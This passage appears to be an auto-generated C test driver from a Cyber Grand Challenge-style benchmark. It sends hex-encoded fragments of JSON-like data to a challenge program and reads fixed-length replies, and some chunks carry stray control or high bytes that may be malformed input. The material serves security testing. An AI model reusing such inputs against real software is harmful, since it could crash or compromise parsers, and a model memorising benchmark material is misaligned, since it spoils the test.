         "\x75\x6c\x6c\x2c\x20\x22\x6c\x63\x47\x44\x45\x66\x79\x46\x6b\x42";
      static unsigned int write_00064_00000_len = 16;
      unsigned char *write_00064 = NULL;
      unsigned int write_00064_len = 0;
      write_00064 = cgc_append_buf(write_00064, &write_00064_len, write_00064_00000, write_00064_00000_len);
      if (write_00064_len > 0) {
         cgc_transmit_all(1, write_00064, write_00064_len);
      }
      cgc_free(write_00064);
   } while (0);
   do {
      unsigned char *read_00065;
      unsigned int read_00065_len;
      unsigned int read_00065_ptr = 0;
      //**** length read
      read_00065_len = 25;
      read_00065 = (unsigned char*)cgc_malloc(read_00065_len);
      int read_00065_res = cgc_length_read(0, read_00065, read_00065_len);
      if (read_00065_res) {} //silence unused variable warning
      cgc_free(read_00065);
      if (read_00065_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00065_00000[] = 
         "\x64\x22\x3a\x20\x2d\x35\x38\x38\x32\x38\x35\x39\x35\x32\x2c\x20";
      static unsigned int write_00065_00000_len = 16;
      unsigned char *write_00065 = NULL;
      unsigned int write_00065_len = 0;
      write_00065 = cgc_append_buf(write_00065, &write_00065_len, write_00065_00000, write_00065_00000_len);
      if (write_00065_len > 0) {
         cgc_transmit_all(1, write_00065, write_00065_len);
      }
      cgc_free(write_00065);
   } while (0);
   do {
      unsigned char *read_00066;
      unsigned int read_00066_len;
      unsigned int read_00066_ptr = 0;
      //**** length read
      read_00066_len = 25;
      read_00066 = (unsigned char*)cgc_malloc(read_00066_len);
      int read_00066_res = cgc_length_read(0, read_00066, read_00066_len);
      if (read_00066_res) {} //silence unused variable warning
      cgc_free(read_00066);
      if (read_00066_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00066_00000[] = 
         "\x22\x73\x53\x4b\x76\x50\x67\x7a\x6c\x6e\x6b\x51\x64\x56\x4f\x45";
      static unsigned int write_00066_00000_len = 16;
      unsigned char *write_00066 = NULL;
      unsigned int write_00066_len = 0;
      write_00066 = cgc_append_buf(write_00066, &write_00066_len, write_00066_00000, write_00066_00000_len);
      if (write_00066_len > 0) {
         cgc_transmit_all(1, write_00066, write_00066_len);
      }
      cgc_free(write_00066);
   } while (0);
   do {
      unsigned char *read_00067;
      unsigned int read_00067_len;
      unsigned int read_00067_ptr = 0;
      //**** length read
      read_00067_len = 25;
      read_00067 = (unsigned char*)cgc_malloc(read_00067_len);
      int read_00067_res = cgc_length_read(0, read_00067, read_00067_len);
      if (read_00067_res) {} //silence unused variable warning
      cgc_free(read_00067);
      if (read_00067_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00067_00000[] = 
         "\x53\x50\x68\x56\x4f\x64\x52\x66\x45\x56\x4d\x73\x34\x2c\x20\x22";
      static unsigned int write_00067_00000_len = 16;
      unsigned char *write_00067 = NULL;
      unsigned int write_00067_len = 0;
      write_00067 = cgc_append_buf(write_00067, &write_00067_len, write_00067_00000, write_00067_00000_len);
      if (write_00067_len > 0) {
         cgc_transmit_all(1, write_00067, write_00067_len);
      }
      cgc_free(write_00067);
   } while (0);
   do {
      unsigned char *read_00068;
      unsigned int read_00068_len;
      unsigned int read_00068_ptr = 0;
      //**** length read
      read_00068_len = 25;
      read_00068 = (unsigned char*)cgc_malloc(read_00068_len);
      int read_00068_res = cgc_length_read(0, read_00068, read_00068_len);
      if (read_00068_res) {} //silence unused variable warning
      cgc_free(read_00068);
      if (read_00068_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00068_00000[] = 
         "\x61\x66\x7a\x41\x6f\x4f\x6b\x6c\x71\x54\x6b\x68\x56\x72\x4b\x46";
      static unsigned int write_00068_00000_len = 16;
      unsigned char *write_00068 = NULL;
      unsigned int write_00068_len = 0;
      write_00068 = cgc_append_buf(write_00068, &write_00068_len, write_00068_00000, write_00068_00000_len);
      if (write_00068_len > 0) {
         cgc_transmit_all(1, write_00068, write_00068_len);
      }
      cgc_free(write_00068);
   } while (0);
   do {
      unsigned char *read_00069;
      unsigned int read_00069_len;
      unsigned int read_00069_ptr = 0;
      //**** length read
      read_00069_len = 25;
      read_00069 = (unsigned char*)cgc_malloc(read_00069_len);
      int read_00069_res = cgc_length_read(0, read_00069, read_00069_len);
      if (read_00069_res) {} //silence unused variable warning
      cgc_free(read_00069);
      if (read_00069_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00069_00000[] = 
         "\x45\x50\x47\x6c\x42\x76\x56\x6e\x4b\x59\x6e\x65\x40\x54\x61\x22";
      static unsigned int write_00069_00000_len = 16;
      unsigned char *write_00069 = NULL;
      unsigned int write_00069_len = 0;
      write_00069 = cgc_append_buf(write_00069, &write_00069_len, write_00069_00000, write_00069_00000_len);
      if (write_00069_len > 0) {
         cgc_transmit_all(1, write_00069, write_00069_len);
      }
      cgc_free(write_00069);
   } while (0);
   do {
      unsigned char *read_00070;
      unsigned int read_00070_len;
      unsigned int read_00070_ptr = 0;
      //**** length read
      read_00070_len = 25;
      read_00070 = (unsigned char*)cgc_malloc(read_00070_len);
      int read_00070_res = cgc_length_read(0, read_00070, read_00070_len);
      if (read_00070_res) {} //silence unused variable warning
      cgc_free(read_00070);
      if (read_00070_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00070_00000[] = 
         "\x3a\x20\x22\x4c\x71\x58\x79\x55\x71\x41\x62\x4b\x7f\x43\x63\x45";
      static unsigned int write_00070_00000_len = 16;
      unsigned char *write_00070 = NULL;
      unsigned int write_00070_len = 0;
      write_00070 = cgc_append_buf(write_00070, &write_00070_len, write_00070_00000, write_00070_00000_len);
      if (write_00070_len > 0) {
         cgc_transmit_all(1, write_00070, write_00070_len);
      }
      cgc_free(write_00070);
   } while (0);
   do {
      unsigned char *read_00071;
      unsigned int read_00071_len;
      unsigned int read_00071_ptr = 0;
      //**** length read
      read_00071_len = 25;
      read_00071 = (unsigned char*)cgc_malloc(read_00071_len);
      int read_00071_res = cgc_length_read(0, read_00071, read_00071_len);
      if (read_00071_res) {} //silence unused variable warning
      cgc_free(read_00071);
      if (read_00071_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00071_00000[] = 
         "\x74\x59\x49\x68\x66\x63\x58\x72\x6e\x22\x2c\x20\x22\x46\x43\x69";
      static unsigned int write_00071_00000_len = 16;
      unsigned char *write_00071 = NULL;
      unsigned int write_00071_len = 0;
      write_00071 = cgc_append_buf(write_00071, &write_00071_len, write_00071_00000, write_00071_00000_len);
      if (write_00071_len > 0) {
         cgc_transmit_all(1, write_00071, write_00071_len);
      }
      cgc_free(write_00071);
   } while (0);
   do {
      unsigned char *read_00072;
      unsigned int read_00072_len;
      unsigned int read_00072_ptr = 0;
      //**** length read
      read_00072_len = 25;
      read_00072 = (unsigned char*)cgc_malloc(read_00072_len);
      int read_00072_res = cgc_length_read(0, read_00072, read_00072_len);
      if (read_00072_res) {} //silence unused variable warning
      cgc_free(read_00072);
      if (read_00072_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00072_00000[] = 
         "\x63\x68\x50\x50\x50\x53\x63\x58\x50\x43\x4b\x6f\x53\x77\x6a\x6c";
      static unsigned int write_00072_00000_len = 16;
      unsigned char *write_00072 = NULL;
      unsigned int write_00072_len = 0;
      write_00072 = cgc_append_buf(write_00072, &write_00072_len, write_00072_00000, write_00072_00000_len);
      if (write_00072_len > 0) {
         cgc_transmit_all(1, write_00072, write_00072_len);
      }
      cgc_free(write_00072);
   } while (0);
   do {
      unsigned char *read_00073;
      unsigned int read_00073_len;
      unsigned int read_00073_ptr = 0;
      //**** length read
      read_00073_len = 25;
      read_00073 = (unsigned char*)cgc_malloc(read_00073_len);
      int read_00073_res = cgc_length_read(0, read_00073, read_00073_len);
      if (read_00073_res) {} //silence unused variable warning
      cgc_free(read_00073);
      if (read_00073_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00073_00000[] = 
         "\x4f\x73\x58\x45\x55\x71\x56\x53\x65\x59\x58\x62\x77\x47\x61\x65";
      static unsigned int write_00073_00000_len = 16;
      unsigned char *write_00073 = NULL;
      unsigned int write_00073_len = 0;
      write_00073 = cgc_append_buf(write_00073, &write_00073_len, write_00073_00000, write_00073_00000_len);
      if (write_00073_len > 0) {
         cgc_transmit_all(1, write_00073, write_00073_len);
      }
      cgc_free(write_00073);
   } while (0);
   do {
      unsigned char *read_00074;
      unsigned int read_00074_len;
      unsigned int read_00074_ptr = 0;
      //**** length read
      read_00074_len = 25;
      read_00074 = (unsigned char*)cgc_malloc(read_00074_len);
      int read_00074_res = cgc_length_read(0, read_00074, read_00074_len);
      if (read_00074_res) {} //silence unused variable warning
      cgc_free(read_00074);
      if (read_00074_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00074_00000[] = 
         "\xc9\x54\x59\x64\x61\x51\x4e\x61\x56\x71\x6d\x63\x54\x65\x55\x74";
      static unsigned int write_00074_00000_len = 16;
      unsigned char *write_00074 = NULL;
      unsigned int write_00074_len = 0;
      write_00074 = cgc_append_buf(write_00074, &write_00074_len, write_00074_00000, write_00074_00000_len);
      if (write_00074_len > 0) {
         cgc_transmit_all(1, write_00074, write_00074_len);
      }
      cgc_free(write_00074);
   } while (0);
   do {
      unsigned char *read_00075;
      unsigned int read_00075_len;
      unsigned int read_00075_ptr = 0;
      //**** length read
      read_00075_len = 25;
      read_00075 = (unsigned char*)cgc_malloc(read_00075_len);
      int read_00075_res = cgc_length_read(0, read_00075, read_00075_len);
      if (read_00075_res) {} //silence unused variable warning
      cgc_free(read_00075);
      if (read_00075_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00075_00000[] = 
         "\x61\x4b\x50\x49\x22\x3a\x20\x33\x35\x34\x32\x37\x32\x32\x36\x37";
      static unsigned int write_00075_00000_len = 16;
      unsigned char *write_00075 = NULL;
      unsigned int write_00075_len = 0;
      write_00075 = cgc_append_buf(write_00075, &write_00075_len, write_00075_00000, write_00075_00000_len);
      if (write_00075_len > 0) {
         cgc_transmit_all(1, write_00075, write_00075_len);
      }
      cgc_free(write_00075);
   } while (0);
   do {
      unsigned char *read_00076;
      unsigned int read_00076_len;
      unsigned int read_00076_ptr = 0;
      //**** length read
      read_00076_len = 25;
      read_00076 = (unsigned char*)cgc_malloc(read_00076_len);
      int read_00076_res = cgc_length_read(0, read_00076, read_00076_len);
      if (read_00076_res) {} //silence unused variable warning
      cgc_free(read_00076);
      if (read_00076_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00076_00000[] = 
         "\x2c\x5a\x62\x72\x78\x49\x70\x7a\x6c\x6a\x5a\x52\x49\x6e\x65\x64";
      static unsigned int write_00076_00000_len = 16;
      unsigned char *write_00076 = NULL;
      unsigned int write_00076_len = 0;
      write_00076 = cgc_append_buf(write_00076, &write_00076_len, write_00076_00000, write_00076_00000_len);
      if (write_00076_len > 0) {
         cgc_transmit_all(1, write_00076, write_00076_len);
      }
      cgc_free(write_00076);
   } while (0);
   do {
      unsigned char *read_00077;
      unsigned int read_00077_len;
      unsigned int read_00077_ptr = 0;
      //**** length read
      read_00077_len = 25;
      read_00077 = (unsigned char*)cgc_malloc(read_00077_len);
      int read_00077_res = cgc_length_read(0, read_00077, read_00077_len);
      if (read_00077_res) {} //silence unused variable warning
      cgc_free(read_00077);
      if (read_00077_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00077_00000[] = 
         "\x63\x22\xfe\x20\x22\x6a\x4a\x46\x68\x67\x22\x7d\x2c\x20\x22\x4c";
      static unsigned int write_00077_00000_len = 16;
      unsigned char *write_00077 = NULL;
      unsigned int write_00077_len = 0;
      write_00077 = cgc_append_buf(write_00077, &write_00077_len, write_00077_00000, write_00077_00000_len);
      if (write_00077_len > 0) {
         cgc_transmit_all(1, write_00077, write_00077_len);
      }
      cgc_free(write_00077);
   } while (0);
   do {
      unsigned char *read_00078;
      unsigned int read_00078_len;
      unsigned int read_00078_ptr = 0;
      //**** length read
      read_00078_len = 25;
      read_00078 = (unsigned char*)cgc_malloc(read_00078_len);
      int read_00078_res = cgc_length_read(0, read_00078, read_00078_len);
      if (read_00078_res) {} //silence unused variable warning
      cgc_free(read_00078);
      if (read_00078_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00078_00000[] = 
         "\x4a\x64\x77\x47\x62\x62\x73\x79\x75\x6a\x7a\x4e\x64\x52\x62\x4f";
      static unsigned int write_00078_00000_len = 16;
      unsigned char *write_00078 = NULL;
      unsigned int write_00078_len = 0;
      write_00078 = cgc_append_buf(write_00078, &write_00078_len, write_00078_00000, write_00078_00000_len);
      if (write_00078_len > 0) {
         cgc_transmit_all(1, write_00078, write_00078_len);
      }
      cgc_free(write_00078);
   } while (0);
   do {
      unsigned char *read_00079;
      unsigned int read_00079_len;
      unsigned int read_00079_ptr = 0;
      //**** length read
      read_00079_len = 25;
      read_00079 = (unsigned char*)cgc_malloc(read_00079_len);
      int read_00079_res = cgc_length_read(0, read_00079, read_00079_len);
      if (read_00079_res) {} //silence unused variable warning
      cgc_free(read_00079);
      if (read_00079_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00079_00000[] = 
         "\x4d\x53\x53\x79\x51\x48\x6a\x68\x45\x77\x44\x42\x66\x22\x3a\x20";
      static unsigned int write_00079_00000_len = 16;
      unsigned char *write_00079 = NULL;
      unsigned int write_00079_len = 0;
      write_00079 = cgc_append_buf(write_00079, &write_00079_len, write_00079_00000, write_00079_00000_len);
      if (write_00079_len > 0) {
         cgc_transmit_all(1, write_00079, write_00079_len);
      }
      cgc_free(write_00079);
   } while (0);
   do {
      unsigned char *read_00080;
      unsigned int read_00080_len;
      unsigned int read_00080_ptr = 0;
      //**** length read
      read_00080_len = 25;
      read_00080 = (unsigned char*)cgc_malloc(read_00080_len);
      int read_00080_res = cgc_length_read(0, read_00080, read_00080_len);
      if (read_00080_res) {} //silence unused variable warning
      cgc_free(read_00080);
      if (read_00080_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00080_00000[] = 
         "\x66\x61\x6c\x73\x65\x2c\x20\x22\x42\x44\x6f\x78\x63\x5a\x3e\x6b";
      static unsigned int write_00080_00000_len = 16;
      unsigned char *write_00080 = NULL;
      unsigned int write_00080_len = 0;
      write_00080 = cgc_append_buf(write_00080, &write_00080_len, write_00080_00000, write_00080_00000_len);
      if (write_00080_len > 0) {
         cgc_transmit_all(1, write_00080, write_00080_len);
      }
      cgc_free(write_00080);
   } while (0);
   do {
      unsigned char *read_00081;
      unsigned int read_00081_len;
      unsigned int read_00081_ptr = 0;
      //**** length read
      read_00081_len = 25;
      read_00081 = (unsigned char*)cgc_malloc(read_00081_len);
      int read_00081_res = cgc_length_read(0, read_00081, read_00081_len);
      if (read_00081_res) {} //silence unused variable warning
      cgc_free(read_00081);
      if (read_00081_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00081_00000[] = 
         "\x49\x46\x61\x42\x43\x4c\x70\x7a\x6d\x78\x5a\x01\x00\x69\x68\x64";
      static unsigned int write_00081_00000_len = 16;
      unsigned char *write_00081 = NULL;
      unsigned int write_00081_len = 0;
      write_00081 = cgc_append_buf(write_00081, &write_00081_len, write_00081_00000, write_00081_00000_len);
      if (write_00081_len > 0) {
         cgc_transmit_all(1, write_00081, write_00081_len);
      }
      cgc_free(write_00081);
   } while (0);
   do {
      unsigned char *read_00082;
      unsigned int read_00082_len;
      unsigned int read_00082_ptr = 0;
      //**** length read
      read_00082_len = 25;
      read_00082 = (unsigned char*)cgc_malloc(read_00082_len);
      int read_00082_res = cgc_length_read(0, read_00082, read_00082_len);
      if (read_00082_res) {} //silence unused variable warning
      cgc_free(read_00082);
      if (read_00082_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00082_00000[] = 
         "\x67\x4c\x59\x6d\x6b\x64\x6d\x4b\x67\x79\x46\x49\x6b\x74\x7a\x4f";
      static unsigned int write_00082_00000_len = 16;
      unsigned char *write_00082 = NULL;
      unsigned int write_00082_len = 0;
      write_00082 = cgc_append_buf(write_00082, &write_00082_len, write_00082_00000, write_00082_00000_len);
      if (write_00082_len > 0) {
         cgc_transmit_all(1, write_00082, write_00082_len);
      }
      cgc_free(write_00082);
   } while (0);
   do {
      unsigned char *read_00083;
      unsigned int read_00083_len;
      unsigned int read_00083_ptr = 0;
      //**** length read
      read_00083_len = 25;
      read_00083 = (unsigned char*)cgc_malloc(read_00083_len);
      int read_00083_res = cgc_length_read(0, read_00083, read_00083_len);
      if (read_00083_res) {} //silence unused variable warning
      cgc_free(read_00083);
      if (read_00083_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00083_00000[] = 
         "\x4c\x49\x71\x56\x69\x4f\x75\x47\x4c\x44\x73\x75\x68\x69\x6d\x56";
      static unsigned int write_00083_00000_len = 16;
      unsigned char *write_00083 = NULL;
      unsigned int write_00083_len = 0;
      write_00083 = cgc_append_buf(write_00083, &write_00083_len, write_00083_00000, write_00083_00000_len);
      if (write_00083_len > 0) {
         cgc_transmit_all(1, write_00083, write_00083_len);
      }
      cgc_free(write_00083);
   } while (0);
   do {
      unsigned char *read_00084;
      unsigned int read_00084_len;
      unsigned int read_00084_ptr = 0;
      //**** length read
      read_00084_len = 25;
      read_00084 = (unsigned char*)cgc_malloc(read_00084_len);
      int read_00084_res = cgc_length_read(0, read_00084, read_00084_len);
      if (read_00084_res) {} //silence unused variable warning
      cgc_free(read_00084);
      if (read_00084_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00084_00000[] = 
         "\x65\x45\x47\x6b\x67\x58\x69\x64\x5a\x74\x22\x3a\x20\x6e\x75\x6c";
      static unsigned int write_00084_00000_len = 16;
      unsigned char *write_00084 = NULL;
      unsigned int write_00084_len = 0;
      write_00084 = cgc_append_buf(write_00084, &write_00084_len, write_00084_00000, write_00084_00000_len);
      if (write_00084_len > 0) {
         cgc_transmit_all(1, write_00084, write_00084_len);
      }
      cgc_free(write_00084);
   } while (0);
   do {
      unsigned char *read_00085;
      unsigned int read_00085_len;
      unsigned int read_00085_ptr = 0;
      //**** length read
      read_00085_len = 25;
      read_00085 = (unsigned char*)cgc_malloc(read_00085_len);
      int read_00085_res = cgc_length_read(0, read_00085, read_00085_len);
      if (read_00085_res) {} //silence unused variable warning
      cgc_free(read_00085);
      if (read_00085_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00085_00000[] = 
         "\x6c\x2c\x20\x22\x78\x44\x67\x49\x6f\x76\x75\x57\x42\x6c\x49\x6b";
      static unsigned int write_00085_00000_len = 16;
      unsigned char *write_00085 = NULL;
      unsigned int write_00085_len = 0;
      write_00085 = cgc_append_buf(write_00085, &write_00085_len, write_00085_00000, write_00085_00000_len);
      if (write_00085_len > 0) {
         cgc_transmit_all(1, write_00085, write_00085_len);
      }
      cgc_free(write_00085);
   } while (0);
   do {
      unsigned char *read_00086;
      unsigned int read_00086_len;
      unsigned int read_00086_ptr = 0;
      //**** length read
      read_00086_len = 25;
      read_00086 = (unsigned char*)cgc_malloc(read_00086_len);
      int read_00086_res = cgc_length_read(0, read_00086, read_00086_len);
      if (read_00086_res) {} //silence unused variable warning
      cgc_free(read_00086);
      if (read_00086_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00086_00000[] = 
         "\x71\x6d\x52\x66\x76\x7a\x4f\x68\x51\x63\x79\x4b\x22\x3a\x20\x6e";
      static unsigned int write_00086_00000_len = 16;
      unsigned char *write_00086 = NULL;
      unsigned int write_00086_len = 0;
      write_00086 = cgc_append_buf(write_00086, &write_00086_len, write_00086_00000, write_00086_00000_len);
      if (write_00086_len > 0) {
         cgc_transmit_all(1, write_00086, write_00086_len);
      }
      cgc_free(write_00086);
   } while (0);
   do {
      unsigned char *read_00087;
      unsigned int read_00087_len;
      unsigned int read_00087_ptr = 0;
      //**** length read
      read_00087_len = 25;
      read_00087 = (unsigned char*)cgc_malloc(read_00087_len);
      int read_00087_res = cgc_length_read(0, read_00087, read_00087_len);
      if (read_00087_res) {} //silence unused variable warning
      cgc_free(read_00087);
      if (read_00087_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00087_00000[] = 
         "\x75\x6c\x6c\x2c\x20\x22\x6c\x4d\x6c\x45\x72\x4d\x9c\x4d\x61\x67";
      static unsigned int write_00087_00000_len = 16;
      unsigned char *write_00087 = NULL;
      unsigned int write_00087_len = 0;
      write_00087 = cgc_append_buf(write_00087, &write_00087_len, write_00087_00000, write_00087_00000_len);
      if (write_00087_len > 0) {
         cgc_transmit_all(1, write_00087, write_00087_len);
      }
      cgc_free(write_00087);
   } while (0);
   do {
      unsigned char *read_00088;
      unsigned int read_00088_len;
      unsigned int read_00088_ptr = 0;
      //**** length read
      read_00088_len = 25;
      read_00088 = (unsigned char*)cgc_malloc(read_00088_len);
      int read_00088_res = cgc_length_read(0, read_00088, read_00088_len);
      if (read_00088_res) {} //silence unused variable warning
      cgc_free(read_00088);
      if (read_00088_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00088_00000[] = 
         "\x6a\x63\x75\x6f\x4e\x5a\x4e\x49\x54\x44\x7a\x65\x63\x6a\x00\x00";
      static unsigned int write_00088_00000_len = 16;
      unsigned char *write_00088 = NULL;
      unsigned int write_00088_len = 0;
      write_00088 = cgc_append_buf(write_00088, &write_00088_len, write_00088_00000, write_00088_00000_len);
      if (write_00088_len > 0) {
         cgc_transmit_all(1, write_00088, write_00088_len);
      }
      cgc_free(write_00088);
   } while (0);
   do {
      unsigned char *read_00089;
      unsigned int read_00089_len;
      unsigned int read_00089_ptr = 0;
      //**** length read
      read_00089_len = 25;
      read_00089 = (unsigned char*)cgc_malloc(read_00089_len);
      int read_00089_res = cgc_length_read(0, read_00089, read_00089_len);
      if (read_00089_res) {} //silence unused variable warning
      cgc_free(read_00089);
      if (read_00089_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00089_00000[] = 
         "\x01\x00\x00\x00\x48\x54\x4c\x44\x47\x78\x74\x4e\x59\x56\x66\x46";
      static unsigned int write_00089_00000_len = 16;
      unsigned char *write_00089 = NULL;
      unsigned int write_00089_len = 0;
      write_00089 = cgc_append_buf(write_00089, &write_00089_len, write_00089_00000, write_00089_00000_len);
      if (write_00089_len > 0) {
         cgc_transmit_all(1, write_00089, write_00089_len);
      }
      cgc_free(write_00089);
   } while (0);
   do {
      unsigned char *read_00090;
      unsigned int read_00090_len;
      unsigned int read_00090_ptr = 0;
      //**** length read
      read_00090_len = 25;
      read_00090 = (unsigned char*)cgc_malloc(read_00090_len);
      int read_00090_res = cgc_length_read(0, read_00090, read_00090_len);
      if (read_00090_res) {} //silence unused variable warning
      cgc_free(read_00090);
      if (read_00090_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00090_00000[] = 
         "\x75\x44\x63\x52\x6d\x75\x6c\x69\x44\x6c\x22\x3a\x20\x7b\x22\x75";
      static unsigned int write_00090_00000_len = 16;
      unsigned char *write_00090 = NULL;
      unsigned int write_00090_len = 0;
      write_00090 = cgc_append_buf(write_00090, &write_00090_len, write_00090_00000, write_00090_00000_len);
      if (write_00090_len > 0) {
         cgc_transmit_all(1, write_00090, write_00090_len);
      }
      cgc_free(write_00090);
   } while (0);
   do {
      unsigned char *read_00091;
      unsigned int read_00091_len;
      unsigned int read_00091_ptr = 0;
      //**** length read
      read_00091_len = 25;
      read_00091 = (unsigned char*)cgc_malloc(read_00091_len);
      int read_00091_res = cgc_length_read(0, read_00091, read_00091_len);
      if (read_00091_res) {} //silence unused variable warning
      cgc_free(read_00091);
      if (read_00091_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00091_00000[] = 
         "\x64\x45\x4c\x74\x64\x58\x79\x7a\x48\x6c\x76\x76\x63\x42\x72\x53";
      static unsigned int write_00091_00000_len = 16;
      unsigned char *write_00091 = NULL;
      unsigned int write_00091_len = 0;
      write_00091 = cgc_append_buf(write_00091, &write_00091_len, write_00091_00000, write_00091_00000_len);
      if (write_00091_len > 0) {
         cgc_transmit_all(1, write_00091, write_00091_len);
      }
      cgc_free(write_00091);
   } while (0);
   do {
      unsigned char *read_00092;
      unsigned int read_00092_len;
      unsigned int read_00092_ptr = 0;
      //**** length read
      read_00092_len = 25;
      read_00092 = (unsigned char*)cgc_malloc(read_00092_len);
      int read_00092_res = cgc_length_read(0, read_00092, read_00092_len);
      if (read_00092_res) {} //silence unused variable warning
      cgc_free(read_00092);
      if (read_00092_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00092_00000[] = 
         "\x59\x66\x48\x77\x57\x46\x51\x6f\x22\x3a\x20\x2d\x31\x2e\x39\x36";
      static unsigned int write_00092_00000_len = 16;
      unsigned char *write_00092 = NULL;
      unsigned int write_00092_len = 0;
      write_00092 = cgc_append_buf(write_00092, &write_00092_len, write_00092_00000, write_00092_00000_len);
      if (write_00092_len > 0) {
         cgc_transmit_all(1, write_00092, write_00092_len);
      }
      cgc_free(write_00092);
   } while (0);
   do {
      unsigned char *read_00093;
      unsigned int read_00093_len;
      unsigned int read_00093_ptr = 0;
      //**** length read
      read_00093_len = 25;
      read_00093 = (unsigned char*)cgc_malloc(read_00093_len);
      int read_00093_res = cgc_length_read(0, read_00093, read_00093_len);
      if (read_00093_res) {} //silence unused variable warning
      cgc_free(read_00093);
      if (read_00093_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00093_00000[] = 
         "\x2c\x20\x22\x6a\x6d\x61\x4d\x46\x57\x6c\x4d\x52\x71\x4a\x66\x7a";
      static unsigned int write_00093_00000_len = 16;
      unsigned char *write_00093 = NULL;
      unsigned int write_00093_len = 0;
      write_00093 = cgc_append_buf(write_00093, &write_00093_len, write_00093_00000, write_00093_00000_len);
      if (write_00093_len > 0) {
         cgc_transmit_all(1, write_00093, write_00093_len);
      }
      cgc_free(write_00093);
   } while (0);
   do {
      unsigned char *read_00094;
      unsigned int read_00094_len;
      unsigned int read_00094_ptr = 0;
      //**** length read
      read_00094_len = 25;
      read_00094 = (unsigned char*)cgc_malloc(read_00094_len);
      int read_00094_res = cgc_length_read(0, read_00094, read_00094_len);
      if (read_00094_res) {} //silence unused variable warning
      cgc_free(read_00094);
      if (read_00094_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00094_00000[] = 
         "\x6b\x66\x67\x5a\x58\x41\x59\xc7\x6e\x4b\x65\x61\x6a\x6c\x78\x50";
      static unsigned int write_00094_00000_len = 16;
      unsigned char *write_00094 = NULL;
      unsigned int write_00094_len = 0;
      write_00094 = cgc_append_buf(write_00094, &write_00094_len, write_00094_00000, write_00094_00000_len);
      if (write_00094_len > 0) {
         cgc_transmit_all(1, write_00094, write_00094_len);
      }
      cgc_free(write_00094);
   } while (0);
   do {
      unsigned char *read_00095;
      unsigned int read_00095_len;
      unsigned int read_00095_ptr = 0;
      //**** length read
      read_00095_len = 25;
      read_00095 = (unsigned char*)cgc_malloc(read_00095_len);
      int read_00095_res = cgc_length_read(0, read_00095, read_00095_len);
      if (read_00095_res) {} //silence unused variable warning
      cgc_free(read_00095);
      if (read_00095_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00095_00000[] = 
         "\x4f\x57\x77\x71\x41\x5a\x45\x62\x61\x43\x53\x51\x22\x3a\x20\x2d";
      static unsigned int write_00095_00000_len = 16;
      unsigned char *write_00095 = NULL;
      unsigned int write_00095_len = 0;
      write_00095 = cgc_append_buf(write_00095, &write_00095_len, write_00095_00000, write_00095_00000_len);
      if (write_00095_len > 0) {
         cgc_transmit_all(1, write_00095, write_00095_len);
      }
      cgc_free(write_00095);
   } while (0);
   do {
      unsigned char *read_00096;
      unsigned int read_00096_len;
      unsigned int read_00096_ptr = 0;
      //**** length read
      read_00096_len = 25;
      read_00096 = (unsigned char*)cgc_malloc(read_00096_len);
      int read_00096_res = cgc_length_read(0, read_00096, read_00096_len);
      if (read_00096_res) {} //silence unused variable warning
      cgc_free(read_00096);
      if (read_00096_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00096_00000[] = 
         "\x30\x2e\x36\x37\x2c\x20\x22\x57\x22\x3a\x20\x22\x63\x77\x6d\x67";
      static unsigned int write_00096_00000_len = 16;
      unsigned char *write_00096 = NULL;
      unsigned int write_00096_len = 0;
      write_00096 = cgc_append_buf(write_00096, &write_00096_len, write_00096_00000, write_00096_00000_len);
      if (write_00096_len > 0) {
         cgc_transmit_all(1, write_00096, write_00096_len);
      }
      cgc_free(write_00096);
   } while (0);
   do {
      unsigned char *read_00097;
      unsigned int read_00097_len;
      unsigned int read_00097_ptr = 0;
      //**** length read
      read_00097_len = 25;
      read_00097 = (unsigned char*)cgc_malloc(read_00097_len);
      int read_00097_res = cgc_length_read(0, read_00097, read_00097_len);
      if (read_00097_res) {} //silence unused variable warning
